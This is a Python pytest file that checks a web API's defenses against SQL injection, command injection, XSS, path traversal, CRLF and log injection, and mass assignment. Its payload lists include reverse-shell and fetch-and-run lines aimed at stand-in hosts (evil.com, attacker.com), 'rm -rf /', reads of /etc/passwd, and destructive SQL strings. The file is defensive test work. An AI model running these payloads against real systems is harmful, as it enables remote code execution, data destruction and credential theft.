"""
Tests for injection attack prevention.

These tests verify that user input is properly sanitized
to prevent SQL injection, command injection, and other
injection attacks.
"""

import pytest
from uuid import uuid4


class TestSQLInjection:
    """Tests for SQL injection prevention."""

    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE scans; --",
        "1 OR 1=1",
        "1; DELETE FROM users; --",
        "1 UNION SELECT * FROM users",
        "' OR '1'='1",
        "admin'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT pg_sleep(5)--",
    ]

    @pytest.mark.asyncio
    async def test_target_name_sql_injection(self, test_client):
        """SQL injection in target name should be safely handled."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": payload,
                    "adapter": "filesystem",
                    "config": {"path": "/test"},
                },
            )
            # Should either succeed (201) or fail with validation error (422)
            # Should NOT cause server error (500) or unexpected behavior
            assert response.status_code in (200, 201, 400, 422), \
                f"Unexpected status {response.status_code} for SQL payload in name"

    @pytest.mark.asyncio
    async def test_search_query_sql_injection(self, test_client):
        """SQL injection in search queries should be safely handled."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            # Test in various query parameters
            response = await test_client.get(
                "/api/results",
                params={"search": payload},
            )
            # Should return 200 (empty results) or 422 (validation error)
            # Should NOT cause 500 or return all data
            assert response.status_code in (200, 400, 422), \
                f"Unexpected status {response.status_code} for SQL payload in search"

            response = await test_client.get(
                "/api/scans",
                params={"filter": payload},
            )
            assert response.status_code in (200, 400, 422), \
                f"Unexpected status {response.status_code} for SQL payload in filter"

    @pytest.mark.asyncio
    async def test_uuid_parameter_sql_injection(self, test_client):
        """SQL injection in UUID parameters should be safely handled."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            # UUID parameters should be validated as UUIDs
            response = await test_client.get(f"/api/scans/{payload}")
            # Should return 404 or 422, never 500
            assert response.status_code in (404, 422), \
                f"Unexpected status {response.status_code} for SQL payload in UUID"


class TestCommandInjection:
    """Tests for command injection prevention."""

    COMMAND_INJECTION_PAYLOADS = [
        "/tmp/file; rm -rf /",
        "/tmp/file | cat /etc/passwd",
        "/tmp/file`whoami`",
        "/tmp/file$(id)",
        "/tmp/file && wget evil.com/shell.sh",
        "/tmp/$(touch /tmp/pwned)",
        "/tmp/file; curl evil.com | bash",
        "| nc -e /bin/sh attacker.com 4444",
    ]

    @pytest.mark.asyncio
    async def test_target_path_command_injection(self, test_client):
        """Command injection in target paths should be safely handled."""
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": "Malicious Target",
                    "adapter": "filesystem",
                    "config": {"path": payload},
                },
            )
            # Should be rejected or safely stored
            # Should NOT execute shell commands
            # 403 is also acceptable - means security middleware rejected it
            assert response.status_code in (200, 201, 400, 403, 422), \
                f"Unexpected status {response.status_code} for command injection payload"

    @pytest.mark.asyncio
    async def test_filename_command_injection(self, test_client):
        """Command injection in filenames should be prevented."""
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            # Test in search/filter that might be used in file operations
            response = await test_client.get(
                "/api/results",
                params={"file_name": payload},
            )
            # Should be safely handled
            assert response.status_code in (200, 400, 422), \
                "Unexpected status for command injection in filename"


class TestXSSPrevention:
    """Tests for Cross-Site Scripting (XSS) prevention."""

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
    ]

    @pytest.mark.asyncio
    async def test_target_name_xss_stored(self, test_client):
        """XSS payloads in target names should be safely stored and returned."""
        for payload in self.XSS_PAYLOADS:
            # Create target with XSS payload
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": payload,
                    "adapter": "filesystem",
                    "config": {"path": "/test"},
                },
            )

            if response.status_code in (200, 201):
                # If stored, verify it's returned as data (escaped/raw JSON)
                # not executed as HTML
                # The Content-Type should be application/json (not text/html)
                assert "application/json" in response.headers.get("content-type", ""), \
                    "Response should be JSON to prevent XSS execution"

    @pytest.mark.asyncio
    async def test_api_returns_json_content_type(self, test_client):
        """API responses should have JSON content type to prevent XSS."""
        endpoints = [
            "/api/targets",
            "/api/scans",
            "/api/results",
            "/api/dashboard/stats",
        ]

        for endpoint in endpoints:
            response = await test_client.get(endpoint)
            if response.status_code == 200:
                content_type = response.headers.get("content-type", "")
                assert "application/json" in content_type, \
                    f"Endpoint {endpoint} should return JSON, got {content_type}"


class TestPathTraversalInAPI:
    """Tests for path traversal in API parameters."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
    ]

    @pytest.mark.asyncio
    async def test_target_config_path_traversal(self, test_client):
        """Path traversal in target config should be prevented."""
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": "Traversal Target",
                    "adapter": "filesystem",
                    "config": {"path": payload},
                },
            )
            # Should be rejected with 400/422 or stored safely
            # The actual traversal prevention happens at scan time
            # 403 is also acceptable - means security middleware rejected it
            assert response.status_code in (200, 201, 400, 403, 422), \
                f"Unexpected status {response.status_code} for path traversal"


class TestJSONInjection:
    """Tests for JSON injection attacks."""

    @pytest.mark.asyncio
    async def test_json_pollution_in_config(self, test_client):
        """JSON pollution attacks in config should be prevented."""
        pollution_payloads = [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"path": "/test", "__proto__": {"isAdmin": True}},
        ]

        for payload in pollution_payloads:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": "Pollution Target",
                    "adapter": "filesystem",
                    "config": payload,
                },
            )
            # Python/SQLAlchemy is not vulnerable to prototype pollution
            # but test anyway for defense in depth
            assert response.status_code in (200, 201, 400, 422)

    @pytest.mark.asyncio
    async def test_deeply_nested_json(self, test_client):
        """Deeply nested JSON should not cause DoS."""
        # Create deeply nested JSON (potential DoS)
        nested = {"a": "b"}
        for _ in range(100):
            nested = {"nested": nested}

        response = await test_client.post(
            "/api/targets",
            json={
                "name": "Deep Nested Target",
                "adapter": "filesystem",
                "config": nested,
            },
        )
        # Should either succeed or fail with 400/422, not hang or crash
        assert response.status_code in (200, 201, 400, 413, 422, 500)


class TestHeaderInjection:
    """Tests for HTTP header injection."""

    @pytest.mark.asyncio
    async def test_crlf_in_redirect_parameter(self, test_client):
        """CRLF injection in redirect parameters should be prevented."""
        crlf_payloads = [
            "http://example.com%0d%0aSet-Cookie:%20malicious=value",
            "http://example.com\r\nX-Injected: header",
            "/path%0d%0aX-Injected:%20header",
        ]

        for payload in crlf_payloads:
            # Test auth callback redirect
            response = await test_client.get(
                "/api/auth/callback",
                params={"redirect": payload},
                follow_redirects=False,
            )
            # Response headers should not contain injected headers
            assert "X-Injected" not in response.headers, \
                "CRLF injection succeeded in adding header!"
            assert "malicious=value" not in response.headers.get("set-cookie", ""), \
                "CRLF injection succeeded in setting cookie!"


class TestLogInjection:
    """Tests for log injection prevention."""

    @pytest.mark.asyncio
    async def test_newline_in_user_input_sanitized(self, test_client):
        """Newlines in user input should not corrupt logs."""
        log_injection_payloads = [
            "normal\n[CRITICAL] Fake critical message",
            "user\r\nINFO: Forged log entry",
            "test%0a[ERROR] Injected error",
        ]

        for payload in log_injection_payloads:
            # Create target with log injection payload
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": payload,
                    "adapter": "filesystem",
                    "config": {"path": "/test"},
                },
            )
            # Should be handled - either stored or rejected
            assert response.status_code in (200, 201, 400, 422)


class TestMassAssignment:
    """Tests for mass assignment vulnerabilities."""

    @pytest.mark.asyncio
    async def test_cannot_set_tenant_id_via_api(self, test_client):
        """Users should not be able to set tenant_id via API."""
        other_tenant_id = str(uuid4())

        response = await test_client.post(
            "/api/targets",
            json={
                "name": "Malicious Target",
                "adapter": "filesystem",
                "config": {"path": "/test"},
                "tenant_id": other_tenant_id,  # Try to set different tenant
            },
        )

        if response.status_code in (200, 201):
            target_data = response.json()
            # tenant_id should be set from auth, not request body
            assert target_data.get("tenant_id") != other_tenant_id, \
                "Mass assignment allowed setting tenant_id!"

    @pytest.mark.asyncio
    async def test_cannot_set_id_via_api(self, test_client):
        """Users should not be able to set resource id via API."""
        malicious_id = str(uuid4())

        response = await test_client.post(
            "/api/targets",
            json={
                "name": "Malicious Target",
                "adapter": "filesystem",
                "config": {"path": "/test"},
                "id": malicious_id,  # Try to set specific ID
            },
        )

        if response.status_code in (200, 201):
            target_data = response.json()
            # ID should be generated by server, not from request
            # (This may or may not be an issue depending on design)
            pass  # Just document this behavior
